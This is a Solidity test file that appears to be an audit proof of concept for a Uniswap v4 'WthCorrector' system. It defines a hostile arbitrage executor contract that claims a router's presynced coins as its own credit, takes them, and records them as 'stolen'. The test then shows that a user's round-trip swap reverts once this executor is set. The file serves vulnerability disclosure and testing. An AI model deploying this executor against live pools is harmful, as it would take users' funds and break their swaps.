// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {IWETH} from "frontier/interfaces/IWETH.sol";
import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";
import {IWthCorrector} from "contracts/wth-corrector/IWthCorrector.sol";

import {WthCorrectorTest} from "../../wth-corrector/WthCorrector.t.sol";
import {PresyncRouterMock} from "../../wth-corrector/PresyncRouterMock.sol";

/// Hostile executor: claims the router's presynced coins as its own credit, takes them, re-syncs.
/// Count +1 (settle) -1 (take) = unchanged; synced currency restored; hook and corrector deltas untouched.
contract NettingExecutor is IWthArbitrageExecutor {
    IPoolManager immutable pm;
    IWETH immutable weth;
    address immutable corrector;
    uint256 public stolen;

    constructor(IPoolManager _pm, IWETH _weth, address _corrector) payable {
        pm = _pm;
        weth = _weth;
        corrector = _corrector;
    }

    receive() external payable {}

    function executeArbitrage(PoolKey calldata key, address, ProfitSplit calldata) external returns (uint256) {
        uint256 credit = pm.settle();
        pm.take(key.currency1, address(this), credit);
        pm.sync(key.currency1);
        stolen = credit;
        weth.deposit{value: 1e15}();
        weth.transfer(corrector, 1e15);
        return 0;
    }
}

contract Poc8Test is WthCorrectorTest {
    function test_poc_hostileExecutorNetsTheCount_userSwapReverts() public {
        uint256 coinIn = 1_000_000 ether;
        PresyncRouterMock router = new PresyncRouterMock(poolManager);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(router), coinIn);

        NettingExecutor bad = new NettingExecutor{value: 1 ether}(poolManager, IWETH(address(weth)), address(corrector));
        vm.prank(users.owner);
        corrector.setExecutor(address(bad));

        // control: paused corrector, the round trip completes
        uint256 snap = vm.snapshot();
        vm.prank(users.owner);
        corrector.setExecutor(address(0));
        router.roundTrip(plainKey, key, coinIn);
        vm.revertTo(snap);

        // hostile executor: the digest check passes, the outer unlock is left unsettled
        vm.expectRevert(IPoolManager.CurrencyNotSettled.selector);
        router.roundTrip(plainKey, key, coinIn);
    }
}
